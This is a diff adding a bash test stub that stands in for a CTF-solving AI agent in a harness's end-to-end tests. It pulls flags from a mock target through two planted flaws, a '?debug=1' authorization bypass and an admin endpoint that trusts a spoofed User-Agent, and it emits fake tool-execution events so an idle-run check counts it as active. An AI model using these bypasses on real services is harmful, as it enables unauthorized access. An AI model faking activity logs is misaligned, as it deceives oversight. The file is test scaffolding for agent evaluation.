@@ -1,0 +1,38 @@
+#!/bin/bash
+# 假 pi —— 端到端测试用,代替真实模型(不花 token、不依赖网络)。
+#
+# 它只做一件真实 agent 会做的事:从 prompt 里读出本题的目标地址,
+# 按 mock 靶场的两个"漏洞"拿 flag,然后用 harness 的提交工具提交。
+# 参数顺序与真实 pi 一致(prompt 是最后一个参数),所以 runner 无感。
+PROMPT=""
+for a in "$@"; do PROMPT="$a"; done
+
+# 让 harness 的"空跑检测"认为这个 worker 确实干过活(真实 pi 的 jsonl 里也有这种事件)
+echo '{"type":"tool_execution_start","toolName":"bash","args":{"command":"curl -k -i http://target/"}}'
+
+qid=$(printf '%s' "$PROMPT" | grep -oE 'unique_code: [A-Za-z0-9_]+' | head -1 | awk '{print $2}')
+url=$(printf '%s' "$PROMPT" | grep -oE 'url1: https?://[0-9.:]+' | head -1 | awk '{print $2}')
+ROOT="${FAKE_PI_ROOT:?FAKE_PI_ROOT 未设置}"
+
+if [ -z "$qid" ] || [ -z "$url" ]; then
+  echo '{"type":"message_end","message":{"role":"assistant","content":[{"type":"text","text":"目标还没就绪,先读黑板"}]}}'
+  exit 0
+fi
+
+# 漏洞 1:?debug=1 参数绕过,越权读接口
+curl -s -m 5 "$url/" > /dev/null 2>&1
+f1=$(curl -s -m 5 "$url/api/flag?id=1&debug=1" | grep -oE 'flag\{[^}]+\}' | head -1)
+if [ -n "$f1" ]; then
+  echo "{\"type\":\"tool_execution_start\",\"toolName\":\"bash\",\"args\":{\"command\":\"submit_flag.py $qid $f1\"}}"
+  python3 "$ROOT/tools/submit_flag.py" "$qid" "$f1"
+fi
+
+# 漏洞 2:管理接口只校验 User-Agent
+f2=$(curl -s -m 5 -A "admin-scanner/1.0" "$url/admin/flag" | grep -oE 'flag\{[^}]+\}' | head -1)
+if [ -n "$f2" ]; then
+  echo "{\"type\":\"tool_execution_start\",\"toolName\":\"bash\",\"args\":{\"command\":\"submit_flag.py $qid $f2\"}}"
+  python3 "$ROOT/tools/submit_flag.py" "$qid" "$f2"
+fi
+
+echo '{"type":"message_end","message":{"role":"assistant","content":[{"type":"text","text":"本轮动作完成"}]}}'
+exit 0
